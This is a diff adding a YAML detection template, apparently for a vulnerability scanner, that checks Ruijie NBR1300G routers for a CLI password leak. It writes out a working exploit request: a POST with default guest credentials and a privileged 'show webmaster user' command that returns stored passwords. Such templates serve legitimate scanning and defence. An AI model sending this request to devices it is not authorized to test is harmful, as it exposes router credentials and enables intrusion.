@@ -1,0 +1,27 @@
+id: ruijie-nbr1300g-exposure
+brief:
+    title: Ruijie NBR1300G Cli Password Leak - Detect
+    by: pikpikcu
+    level: high
+    about: Ruijie NBR1300G CLI password leak vulnerability was detected.
+    label:
+        - ruijie
+        - exposure
+        - vuln
+    score: CVSS:7.5
+moves:
+    - verb: POST
+      to:
+        - '{{BaseURL}}/WEB_VMS/LEVEL15/'
+      head:
+        Authorization: Basic Z3Vlc3Q6Z3Vlc3Q=
+      body: command=show webmaster user&strurl=exec%04&mode=%02PRIV_EXEC&signname=Red-Giant.
+      signs:
+        - "on": word
+          has:
+            - webmaster level 2 username guest password guest
+          in: body
+          need: all
+        - "on": status
+          status:
+            - 200
